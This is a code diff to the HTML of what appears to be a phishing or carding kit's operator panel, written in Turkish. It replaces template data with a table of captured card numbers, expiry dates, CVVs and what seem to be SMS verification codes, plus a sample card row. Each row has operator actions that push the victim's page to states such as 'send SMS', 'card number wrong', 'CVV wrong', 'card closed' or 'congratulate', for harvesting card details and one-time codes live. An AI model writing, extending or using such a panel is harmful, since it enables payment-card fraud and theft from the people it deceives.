@@ -36,7 +36,7 @@
                 <thead>
                     <tr>
                         <th>Sıra</th>
-                        <th>Sipariş Bilgileri</th>
+                        <th>Adres Bilgileri</th>
                         <th>Kart Numarası</th>
                         <th>Kart SKT</th>
                         <th>Kart CVV</th>
@@ -54,10 +54,36 @@
                     <tr>
                         <td>1</td>
                         <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal">Göster</button></td>
-                        <td>Edinburgh</td>
-                        <td>61</td>
-                        <td>2011/04/25</td>
-                        <td>$320,800</td>
+                        <td>4543 6047 8787 9898</td>
+                        <td>07/25</td>
+                        <td>784</td>
+                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal">Göster</button></td>
+                        <td style="color: green">787887</td>
+                        <td style="color: green">545454</td>
+                        <td>23/12/2023 12:53:05</td>
+                        <td>10500 ₺</td>
+                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal">Göster</button></td>
+                        <td>
+                              <select id="select-area" data-id="1">
+                                    <option>Seç</option>
+                                    <option value="ban">Banla</option>
+                                    <option value="delete">Logu sil</option>
+                                    <option value="3dsecure">SMS Gönder</option>
+                                    <option value="tebrik">Tebrikle</option>
+                                    <option value="hatali">Hatalıya Gönder</option>
+                                    <option value="dogrulama">Dogrulama</option>
+                                    <option value="ccno_error">CCNO Hatalı</option>
+                                    <option value="skt_error">SKT Hatalı</option>
+                                    <option value="cvv_error">CVV Hatalı</option>
+                                    <option value="bekle">Bekle</option>
+                                    <option value="closed_card">Kart Kapalı</option>
+                                    <option value="red_card">Hata Ver</option>
+                                    <option value="phone_error">Telefon Hatalı</option>
+                                </select>
+                   
+                        </td>
+                        <td style="color: green">İşlemi Bitirdi</td>
+
                     </tr>
                 </tbody>
                 <tfoot>
